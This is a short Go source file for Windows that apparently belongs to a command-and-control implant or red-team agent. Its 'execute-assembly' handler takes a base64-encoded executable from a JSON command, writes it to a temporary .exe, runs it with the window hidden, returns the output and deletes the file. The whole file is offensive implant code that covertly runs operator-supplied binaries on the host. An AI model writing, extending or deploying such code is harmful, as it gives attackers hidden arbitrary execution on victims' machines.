//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

type ExecuteAssemblyParams struct {
	AssemblyID string `json:"assembly_id"`
	Arguments  string `json:"arguments"`
}

func cmdExecuteAssembly(raw json.RawMessage) string {
	var p ExecuteAssemblyParams
	if err := json.Unmarshal(raw, &p); err != nil {
		return "error: " + err.Error()
	}

	data, err := base64.StdEncoding.DecodeString(p.AssemblyID)
	if err != nil {
		return "error: assembly decode: " + err.Error()
	}

	tmpFile, err := os.CreateTemp("", "*.exe")
	if err != nil {
		return "error: temp file: " + err.Error()
	}
	tmpPath := tmpFile.Name()
	defer os.Remove(tmpPath)

	if _, err := tmpFile.Write(data); err != nil {
		tmpFile.Close()
		return "error: write: " + err.Error()
	}
	tmpFile.Close()

	cmd := exec.Command(tmpPath, p.Arguments)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	var stdout, stderr strings.Builder
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		output := stdout.String()
		if output == "" {
			output = stderr.String()
		}
		if output == "" {
			output = err.Error()
		}
		return output
	}

	return strings.TrimSpace(stdout.String())
}
